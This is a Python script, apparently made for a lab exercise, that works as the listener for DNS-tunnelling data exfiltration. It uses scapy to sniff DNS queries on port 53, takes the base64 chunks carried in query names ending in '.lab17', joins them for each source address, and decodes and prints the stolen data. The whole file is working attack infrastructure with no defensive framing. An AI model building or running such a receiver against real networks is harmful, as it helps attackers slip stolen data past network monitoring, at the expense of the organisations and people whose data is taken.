import base64
import time
from scapy.all import sniff, DNS, DNSQR, IP
from colorama import Fore, Style, init

init(autoreset=True)

received_data = {}
last_received_time = {}

def decode_base64_data(data):
    try:
        padding_needed = len(data) % 4
        if padding_needed:
            data += "=" * (4 - padding_needed)
        decoded_data = base64.b64decode(data).decode('utf-8')
        return decoded_data
    except Exception as e:
        return f"Error decoding data: {e}"

def process_packet(packet):
    global received_data, last_received_time

    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        query = packet[DNSQR].qname.decode('utf-8').rstrip('.')
        print(f"Received DNS query from {packet[IP].src}: {query}")

        if query.endswith(".lab17"):
            chunk = query.split('.')[0]
            print(f"Exfiltrated chunk: {chunk}")

            if packet[IP].src not in received_data:
                received_data[packet[IP].src] = ""

            received_data[packet[IP].src] += chunk.replace("-", "=")  # Replace '-' with '=' for base64
            last_received_time[packet[IP].src] = time.time()

            current_data = received_data[packet[IP].src]
            print(f"Current accumulated data for {packet[IP].src}: {current_data}")

def check_for_complete_data():
    global received_data, last_received_time

    while True:
        current_time = time.time()
        for addr in list(last_received_time.keys()):
            if current_time - last_received_time[addr] > 3:
                full_data = received_data[addr].replace("\n", "")
                print(f"Attempting to decode data: {full_data}")
                decoded_data = decode_base64_data(full_data)
                print(f"Final accumulated data for {addr}: {full_data}")
                print(f"Decoded data: {Fore.LIGHTGREEN_EX}{decoded_data}{Style.RESET_ALL}")

                del received_data[addr]
                del last_received_time[addr]

        time.sleep(1)

def start_dns_listener():
    print("Listening for DNS queries...")
    sniff(filter="udp port 53", prn=process_packet)

if __name__ == "__main__":
    from threading import Thread

    listener_thread = Thread(target=start_dns_listener)
    listener_thread.start()

    checker_thread = Thread(target=check_for_complete_data)
    checker_thread.start()

    listener_thread.join()
    checker_thread.join()
